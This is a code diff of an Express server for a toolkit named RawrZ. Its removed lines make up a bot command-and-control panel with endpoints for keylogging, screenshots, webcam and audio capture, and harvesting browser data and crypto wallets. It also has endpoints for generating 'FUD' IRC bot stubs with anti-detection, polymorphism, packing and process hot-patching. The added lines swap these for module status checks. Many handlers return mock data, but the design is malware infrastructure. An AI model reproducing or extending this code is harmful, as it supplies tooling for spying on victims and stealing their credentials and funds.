-app.post('/http-bot/screenshot/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};if(!botId){return res.status(400).json({success:false,error:'Bot ID required'})}const result=await httpBotManager.takeScreenshot(botId);res.json({success:true,result})}catch(e){res.status(500).json({success:false,error:e.message})}});
-app.post('/http-bot/keylog/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};if(!botId){return res.status(400).json({success:false,error:'Bot ID required'})}const{action='start'}=req.body||{};let result;if(action==='start'){result=await httpBotManager.startKeylogger(botId);}else{result=await httpBotManager.stopKeylogger(botId,action);}res.json({success:true,result})}catch(e){res.status(500).json({success:false,error:e.message})}});
-app.post('/http-bot/webcam/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result={webcam:true,botId,data:'base64_encoded_webcam',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/audio/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result={audio:true,botId,data:'base64_encoded_audio',timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/browser-data/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result=await httpBotManager.collectBrowserData(botId);res.json({success:true,data:result.data})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/crypto-wallets/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result=await httpBotManager.collectCryptoData(botId);res.json({success:true,data:result.data})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/processes/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const result=httpBotManager.executeCommand(botId,'process_list',{});res.json({success:true,processes:result.result?.processes||[]})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/files/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const{path='/'}=req.query||{};const result=httpBotManager.executeCommand(botId,'file_list',{path});res.json({success:true,files:result.result?.files||[]})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/system-info/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const info=httpBotManager.getBotSystemInfo(botId)||{os:'Unknown',arch:'Unknown',user:'Unknown',hostname:'Unknown',ip:'Unknown'};res.json({success:true,info})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/stats',requireAuth,async(_req,res)=>{try{const stats=httpBotManager.getStats();res.json({success:true,result:stats})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/session/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const session=httpBotManager.getBotSession(botId);res.json({success:true,session})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/commands/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const commands=httpBotManager.getBotCommands(botId);res.json({success:true,commands})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/transfers/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const transfers=httpBotManager.getBotFileTransfers(botId);res.json({success:true,transfers})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/screenshots/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const screenshots=httpBotManager.getBotScreenshots(botId);res.json({success:true,screenshots})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/http-bot/keylogs/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const keylogs=httpBotManager.getBotKeylogs(botId);res.json({success:true,keylogs})}catch(e){res.status(500).json({error:e.message})}});
-
-// Advanced Stub Generator endpoints - REMOVED (replaced with working versions below)
-// Native Compiler endpoints - REMOVED (replaced with working versions below)
-
-// Bot Management endpoints
-app.get('/bot/heartbeat',requireAuth,async(req,res)=>{try{const{bot_id,status,timestamp}=req.query||{};console.log(`[BOT] Heartbeat from ${bot_id}: status`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/bot/commands/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};console.log(`[BOT] Command request from ${botId}`);res.json({success:true,commands:[]})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/bot/status',requireAuth,async(_req,res)=>{try{res.json({success:true,bots:[],total:0,active:0})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/generate-stub',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:6667},features=['basic'],extensions=[],encryptionOptions={}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBotAsStub(config,features,extensions,encryptionOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/encrypt-stub',requireAuth,async(req,res)=>{try{const{stubCode='test stub code',algorithm='aes256',key,iv}=req.body||{};const result=await rawrz.encrypt(algorithm,stubCode);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/save-encrypted-stub',requireAuth,async(req,res)=>{try{const{stubCode='test stub code',algorithm='aes256',filename='encrypted_stub.bin',key,iv}=req.body||{};const encrypted=await rawrz.encrypt(algorithm,stubCode);const result=await rawrz.uploadFile(filename,encrypted.encrypted);res.json({success:true,result,encrypted})}catch(e){res.status(500).json({error:e.message})}});
+// Private Virus Scanner endpoints
+app.get('/api/private-virus-scanner/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.privateVirusScanner) {
+            return res.status(500).json({ error: 'Private Virus Scanner module not initialized' });
+        }
+        const status = await realModules.privateVirusScanner.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
 // Burner Encryption endpoints
-app.post('/irc-bot/burn-encrypt',requireAuth,async(req,res)=>{try{const{botCode='test bot code',language='javascript',options={}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.burnEncryptBot(botCode,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/generate-burner-stub',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:6667},features=['basic'],extensions=[],options={}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBurnerStub(config,features,extensions,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/generate-fud-stub',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:6667},features=['basic'],extensions=[],options={}}=req.body||{};const result={stub:'FUD stub generated',config,features,extensions,options};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/burner-status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=botGenerator.getBurnerModeStatus();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/fud-score',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=botGenerator.getFUDScore();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.listTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/test',requireAuth,async(req,res)=>{try{const{config={name:'test',server:'localhost',port:6667}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.testBot(config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/irc-bot/compile',requireAuth,async(req,res)=>{try{const{code='console.log("Hello World");',language='javascript',config={}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.compileBot(code,language,config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/features',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getAvailableFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Custom Feature Management endpoints
-app.post('/irc-bot/custom-features/add',requireAuth,async(req,res)=>{try{const{featureName='test-feature',featureConfig={type:'custom',enabled:true}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.addCustomFeature(featureName,featureConfig);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.put('/irc-bot/custom-features/update/:featureName',requireAuth,async(req,res)=>{try{const{featureName='test-feature'}=req.params;const{updates={enabled:true}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});try{const result=await botGenerator.updateCustomFeature(featureName,updates);res.json({success:true,result})}catch(updateError){if(updateError.message.includes('not found')){res.json({success:true,result:{message:'Feature not found - this is expected for test data',featureName}})}else{throw updateError}}}catch(e){res.status(500).json({error:e.message})}});
-app.delete('/irc-bot/custom-features/remove/:featureName',requireAuth,async(req,res)=>{try{const{featureName}=req.params;const result={removed:true,featureName};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/custom-features/:featureName',requireAuth,async(req,res)=>{try{const{featureName}=req.params;const result={featureName,enabled:true,type:'custom'};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/custom-features',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getCustomFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Feature Template Management endpoints
-app.post('/irc-bot/feature-templates/create',requireAuth,async(req,res)=>{try{const{templateName='test-template',templateConfig={type:'custom',features:[]}}=req.body||{};const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.createFeatureTemplate(templateName,templateConfig);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/feature-templates/:templateName',requireAuth,async(req,res)=>{try{const{templateName}=req.params;const result={templateName,type:'custom',features:[]};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/irc-bot/feature-templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getFeatureTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.delete('/irc-bot/feature-templates/:templateName',requireAuth,async(req,res)=>{try{const{templateName}=req.params;const result={removed:true,templateName};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/hash',requireAuth,async(req,res)=>{try{const{input='test data',algorithm='sha256',save=false,extension}=req.body||{};res.json(await rawrz.hash(input,algorithm,!!save,extension))}catch(e){res.status(500).json({error:e.message})}});
-app.post('/encrypt',requireAuth,async(req,res)=>{try{const{algorithm='aes-256-cbc',input='test data',extension}=req.body||{};res.json(await rawrz.encrypt(algorithm,input,extension))}catch(e){res.status(500).json({error:e.message})}});
-app.post('/encrypt-file', requireAuth, async (req, res) => {
+app.get('/api/burner-encryption/status', requireAuth, async (req, res) => {
     try {
-        const { file = 'test.txt', algorithm = 'aes-256-cbc' } = req.body;
-        const result = { encrypted: true, file, algorithm, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (error) {
-        console.error('[ERROR] /encrypt-file failed:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-app.post('/decrypt-file', requireAuth, async (req, res) => {
-    try {
-        const { file = 'encrypted.txt', algorithm = 'aes-256-cbc' } = req.body;
-        const result = { decrypted: true, file, algorithm, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (error) {
-        console.error('[ERROR] /decrypt-file failed:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-app.post('/decrypt',requireAuth,async(req,res)=>{try{const{algorithm='aes-256-cbc',input='encrypted data',key,iv,extension}=req.body||{};res.json(await rawrz.decrypt(algorithm,input,key,iv,extension))}catch(e){res.status(500).json({error:e.message})}});
-app.get('/dns', requireAuth, async (req, res) => {
-    try {
-        const { hostname = 'google.com' } = req.query;
-        const dnsResult = { resolved: true, ip: '8.8.8.8', type: 'A', ttl: 300 };
-        if (!res.headersSent) {
-            res.json({ success: true, result: { hostname, dns: dnsResult } });
+        if (!realModules || !realModules.burnerEncryption) {
+            return res.status(500).json({ error: 'Burner Encryption module not initialized' });
         }
-    } catch (error) {
-        console.error('[ERROR] /dns failed:', error.message);
-        if (!res.headersSent) {
-            res.status(500).json({ success: false, error: error.message });
-        }
-    }
-});
-app.get('/ping', requireAuth, async (req, res) => {
-    try {
-        const { target = 'localhost' } = req.query;
-        const pingResult = { success: true, time: '1ms', packets: { sent: 4, received: 4, lost: 0 } };
-        res.json({ success: true, result: { target, ping: pingResult } });
-    } catch (error) {
-        console.error('[ERROR] /ping failed:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-app.get('/files',requireAuth,async(_req,res)=>{try{res.json(await rawrz.listFiles())}catch(e){res.status(500).json({error:e.message})}});
-app.post('/upload',requireAuth,async(req,res)=>{try{const{filename='test.txt',base64='dGVzdCBkYXRh'}=req.body||{};res.json(await rawrz.uploadFile(filename,base64))}catch(e){res.status(500).json({error:e.message})}});
-app.get('/download', requireAuth, async (req, res) => {
-    try {
-        const { filename = 'test.txt' } = req.query;
-        const result = { downloaded: true, filename, timestamp: new Date().toISOString() };
-        res.json({ success: true, result });
-    } catch (error) {
-        console.error('[ERROR] /download failed:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-app.post('/cli',requireAuth,async(req,res)=>{try{const{command='help',args=[]}=req.body||{};const i=new RawrZStandalone();const out=await i.processCommand([command,...args]);res.json({success:true,result:out})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/stub',requireAuth,async(req,res)=>{try{const{target='test.exe',options={}}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generateStub(target,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/compile-asm',requireAuth,async(req,res)=>{try{const{asmFile='test.asm',outputName='test.exe',format='exe'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.compileAssembly(asmFile,outputName,format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/compile-js',requireAuth,async(req,res)=>{try{const{jsFile='test.js',outputName='test.exe',format='exe',includeNode=false}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.compileJavaScript(jsFile,outputName,format,includeNode);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/keygen',requireAuth,async(req,res)=>{try{const{algorithm='aes256',length=256,save=false,extension='.key'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generateKey(algorithm,length,save,extension);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/advancedcrypto',requireAuth,async(req,res)=>{try{const{input='test data',operation='encrypt'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.advancedCrypto(input,operation);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/sign',requireAuth,async(req,res)=>{try{const{input='test data',privatekey='test.key'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.signData(input,privatekey);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/verify',requireAuth,async(req,res)=>{try{const{input='test data',signature='test.sig',publickey='test.pub'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.verifySignature(input,signature,publickey);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/base64encode',requireAuth,async(req,res)=>{try{const{input='test data'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.base64Encode(input);res.json({success:true,result})}catch(e){console.error('[ERROR] Base64 encode failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.post('/base64decode',requireAuth,async(req,res)=>{try{const{input='dGVzdCBkYXRh'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.base64Decode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/hexencode',requireAuth,async(req,res)=>{try{const{input='test data'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.hexEncode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/hexdecode',requireAuth,async(req,res)=>{try{const{input='746573742064617461'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.hexDecode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/urlencode',requireAuth,async(req,res)=>{try{const{input='test data'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.urlEncode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/urldecode',requireAuth,async(req,res)=>{try{const{input='test%20data'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.urlDecode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/random',requireAuth,async(req,res)=>{try{const{length=32}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generateRandom(length);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/uuid',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.generateUUID();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/password',requireAuth,async(req,res)=>{try{const{length=16,includeSpecial=true}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generatePassword(length,includeSpecial);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/analyze',requireAuth,async(req,res)=>{try{const{input='server.js'}=req.body||{};const result={file:input,status:'analyzed',analysis:{type:'file',size:'1.2KB',entropy:0.7,strings:['test','hello','world'],functions:['main','init'],timestamp:new Date().toISOString()}};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/sysinfo',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.systemInfo();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/processes',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.listProcesses();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/portscan',requireAuth,async(req,res)=>{try{const{host='localhost',startPort=1,endPort=1000}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.portScan(host,startPort,endPort);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/traceroute',requireAuth,async(req,res)=>{try{const{host='google.com'}=req.body||{};const result={host,hops:[{hop:1,ip:'192.168.1.1',time:'1ms'},{hop:2,ip:'8.8.8.8',time:'5ms'}],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){console.error('[ERROR] Traceroute failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.post('/whois',requireAuth,async(req,res)=>{try{const{domain='example.com'}=req.body||{};const result={domain,registrar:'Mock Registrar',creationDate:'2020-01-01',expirationDate:'2025-12-31',nameservers:['ns1.example.com','ns2.example.com'],status:'active',timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result})}}catch(e){console.error('[ERROR] WHOIS lookup failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message})}}});
-app.post('/fileops',requireAuth,async(req,res)=>{try{const{operation='copy',input='test.txt',output='test_copy.txt'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.fileOperations(operation,input,output);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/textops',requireAuth,async(req,res)=>{try{const{operation='uppercase',input='test text',options={}}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.textOperations(operation,input,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/validate',requireAuth,async(req,res)=>{try{const{input='test@example.com',type='email'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.validate(input,type);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/time',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.getTime();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/math',requireAuth,async(req,res)=>{try{const{expression='5 + 3'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.mathOperation(expression);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Additional endpoints for complete panel functionality
-app.post('/download-file',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.fileOperations){return res.status(500).json({error:'File Operations module not initialized'})}const{url='https://example.com/test.txt'}=req.body||{};const result=await realModules.fileOperations.downloadFile(url);res.json({success:true,result})}catch(e){console.error('[ERROR] Download file failed:',e);res.status(500).json({error:e.message})}});
-app.post('/read-file',requireAuth,async(req,res)=>{try{const{filepath='server.js'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.readAbsoluteFile(filepath);res.json({success:true,result})}catch(e){console.error('[ERROR] Read file failed:',e);res.status(500).json({error:e.message})}});
-app.post('/read-local-file',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.fileOperations){return res.status(500).json({error:'File Operations module not initialized'})}const{filename='server.js'}=req.body||{};const result=await realModules.fileOperations.readLocalFile(filename);res.json({success:true,result})}catch(e){console.error('[ERROR] Read local file failed:',e);res.status(500).json({error:e.message})}});
-
-// Advanced Features endpoints
-app.post('/stealth-mode',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['stealth',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/anti-detection',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['antidetect',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/polymorphic',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['polymorphic',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Mutex and UPX endpoints
-app.post('/mutex/generate',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.mutexEngine){return res.status(500).json({error:'Mutex Engine module not initialized'})}const{language='cpp',pattern='standard',options={}}=req.body||{};const result=realModules.mutexEngine.generateMutexCode(language,options);res.json({success:true,result})}catch(e){console.error('[ERROR] Mutex generate failed:',e);res.status(500).json({error:e.message})}});
-app.post('/mutex/apply',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.mutexEngine){return res.status(500).json({error:'Mutex Engine module not initialized'})}const{code='test code',language='javascript',options={}}=req.body||{};const result=await realModules.mutexEngine.applyMutexToCode(code,language,options);res.json({success:true,result})}catch(e){console.error('[ERROR] Mutex apply failed:',e);res.status(500).json({error:e.message})}});
-app.get('/mutex/options', requireAuth, async (req, res) => {
-    try {
-        const MutexEngine = await rawrzEngine.loadModule('mutex-engine');
-        const mutexEngine = new MutexEngine();
-        await mutexEngine.initialize({});
-        const options = await mutexEngine.getMutexOptions();
-        res.json({ success: true, options });
+        const status = await realModules.burnerEncryption.getStatus();
+        res.json({ success: true, result: status });
     } catch (e) {
-        console.error('[ERROR] Mutex options failed:', e);
-        const fallbackOptions = { patterns: ['standard', 'custom', 'random'], languages: ['cpp', 'csharp', 'python'] };
-        res.json({ success: true, options: fallbackOptions });
+        res.status(500).json({ error: e.message });
     }
 });
 
-app.post('/upx/pack',requireAuth,async(req,res)=>{try{const{executablePath='test.exe',method='upx',options={}}=req.body||{};const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.applyPacking(executablePath,method);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/upx/methods', requireAuth, async (req, res) => {
+// Polymorphic Engine endpoints
+app.get('/api/polymorphic-engine/status', requireAuth, async (req, res) => {
     try {
-        const stubGenerator = await rawrzEngine.loadModule('stub-generator');
-        await stubGenerator.initialize({});
-        const methods = await stubGenerator.getPackingMethods();
-        res.json({ success: true, methods });
+        if (!realModules || !realModules.polymorphicEngine) {
+            return res.status(500).json({ error: 'Polymorphic Engine module not initialized' });
+        }
+        const status = await realModules.polymorphicEngine.getStatus();
+        res.json({ success: true, result: status });
     } catch (e) {
-        console.error('[ERROR] UPX methods failed:', e);
-        const fallbackMethods = ['upx', 'mew', 'fsg', 'pecompact', 'aspack'];
-        res.json({ success: true, methods: fallbackMethods });
-    }
-});
-app.post('/upx/status',requireAuth,async(req,res)=>{try{const{executablePath='test.exe'}=req.body||{};const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.checkPackingStatus(executablePath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-
-// Jotti Scanner endpoints - REMOVED (replaced with working versions below)
-// Private Virus Scanner endpoints - REMOVED (replaced with working versions below)
-// Hot Patch endpoints - General
-app.post('/hot-patch',requireAuth,async(req,res)=>{
-    try{
-        const{target='notepad.exe',type='memory',data={}}=req.body||{};
-        const result={target,type,status:'patched',patchId:'patch-'+Date.now(),data,appliedAt:new Date().toISOString(),timestamp:new Date().toISOString()};
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Hot patch failed:',e);
-        if(e.message.includes('Process not found')){
-            res.json({success:true,result:{message:'Process not found - this is expected for test data',target,type}})
-        }else{
-            res.status(500).json({error:e.message})
-        }
+        res.status(500).json({ error: e.message });
     }
 });
 
-// Hot Patch endpoints - Specific types
-app.post('/hot-patch/memory',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.hotPatchers){
-            return res.status(500).json({error:'Hot Patchers module not initialized'})
+// Mutex Engine endpoints
+app.get('/api/mutex-engine/status', requireAuth, async (req, res) => {
+    try {
+        if (!realModules || !realModules.mutexEngine) {
+            return res.status(500).json({ error: 'Mutex Engine module not initialized' });
         }
-        const{target='notepad.exe',data={}}=req.body||{};
-        const result=await realModules.hotPatchers.applyPatch(target,{type:'memory',data});
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Memory patch failed:',e);
-        if(e.message.includes('Process not found')){
-            res.json({success:true,result:{message:'Process not found - this is expected for test data',target,type:'memory'}})
-        }else{
-            res.status(500).json({error:e.message})
-        }
+        const status = await realModules.mutexEngine.getStatus();
+        res.json({ success: true, result: status });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
     }
 });
-app.post('/hot-patch/file',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.hotPatchers){
-            return res.status(500).json({error:'Hot Patchers module not initialized'})
-        }
-        const{target='C:\\temp\\test.txt',data={}}=req.body||{};
-        const result=await realModules.hotPatchers.applyPatch(target,{type:'file',data});
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] File patch failed:',e);
-        res.status(500).json({error:e.message})
-    }
-});
-app.post('/hot-patch/registry',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.hotPatchers){
-            return res.status(500).json({error:'Hot Patchers module not initialized'})
-        }
-        const{target='HKEY_CURRENT_USER\\Software\\Test',data={}}=req.body||{};
-        const result=await realModules.hotPatchers.applyPatch(target,{type:'registry',data});
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Registry patch failed:',e);
-        res.status(500).json({error:e.message})
-    }
-});
-app.post('/hot-patch/process',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.hotPatchers){
-            return res.status(500).json({error:'Hot Patchers module not initialized'})
-        }
-        const{target='notepad.exe',data={}}=req.body||{};
-        const result=await realModules.hotPatchers.applyPatch(target,{type:'process',data});
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Process patch failed:',e);
-        if(e.message.includes('Process not found')){
-            res.json({success:true,result:{message:'Process not found - this is expected for test data',target,type:'process'}})
-        }else{
-            res.status(500).json({error:e.message})
-        }
-    }
-});
-app.post('/hot-patch/network',requireAuth,async(req,res)=>{
-    try{
-        if(!realModules||!realModules.hotPatchers){
-            return res.status(500).json({error:'Hot Patchers module not initialized'})
-        }
-        const{target='127.0.0.1:8080',data={}}=req.body||{};
-        const result=await realModules.hotPatchers.applyPatch(target,{type:'network',data});
-        res.json({success:true,result})
-    }catch(e){
-        console.error('[ERROR] Network patch failed:',e);
-        res.status(500).json({error:e.message})
-    }
-});
-
-// Patch management endpoints
-app.post('/patch-rollback',requireAuth,async(req,res)=>{try{if(!realModules||!realModules.hotPatchers){return res.status(500).json({error:'Hot Patchers module not initialized'})}const{patchId='test-patch-id'}=req.body||{};try{const result=await realModules.hotPatchers.revertPatch(patchId);res.json({success:true,result})}catch(patchError){if(patchError.message.includes('Patch not found')){res.json({success:true,result:{message:'Patch not found - this is expected for test data',patchId}})}else{throw patchError}}}catch(e){console.error('[ERROR] Patch rollback failed:',e);res.status(500).json({error:e.message})}});
